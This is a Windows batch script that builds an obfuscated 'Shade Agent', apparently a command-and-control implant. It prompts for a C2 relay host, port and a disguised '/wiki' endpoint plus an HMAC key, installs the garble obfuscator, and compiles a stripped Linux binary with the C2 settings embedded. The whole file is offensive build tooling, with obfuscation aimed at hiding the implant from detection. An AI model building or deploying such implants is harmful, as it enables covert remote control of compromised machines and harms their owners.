@echo off
setlocal enabledelayedexpansion

echo ==========================================
echo     Shade Agent Builder (Garble)
echo ==========================================
echo.

REM Prompt for configuration
set /p C2_HOST="C2 Relay Host [localhost]: "
if "%C2_HOST%"=="" set C2_HOST=localhost

set /p C2_PORT="C2 Relay Port [2222]: "
if "%C2_PORT%"=="" set C2_PORT=2222

set /p C2_ENDPOINT="C2 Endpoint [/wiki]: "
if "%C2_ENDPOINT%"=="" set C2_ENDPOINT=/wiki

set /p HMAC_KEY="HMAC Key (hex): "

if "%HMAC_KEY%"=="" (
    echo [ERROR] HMAC key is required!
    exit /b 1
)

echo.
echo Configuration:
echo   Host:     %C2_HOST%
echo   Port:     %C2_PORT% (SSH)
echo   Endpoint: %C2_ENDPOINT%
echo   HMAC Key: %HMAC_KEY:~0,16%...%HMAC_KEY:~-8%
echo.

REM Check if garble is installed
where garble >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [*] Garble not found. Installing...
    go install mvdan.cc/garble@latest
    if %ERRORLEVEL% NEQ 0 (
        echo [ERROR] Failed to install garble
        exit /b 1
    )
    echo [+] Garble installed successfully
)

echo [*] Building with garble obfuscation...

REM Build with garble for Linux
set GOOS=linux
set GOARCH=amd64
garble -literals -tiny build -ldflags "-s -w -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY%" -o shade-agent main.go

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [SUCCESS] Build complete: shade-agent
    echo.
    dir /b shade-agent
) else (
    echo.
    echo [ERROR] Build failed!
    exit /b 1
)

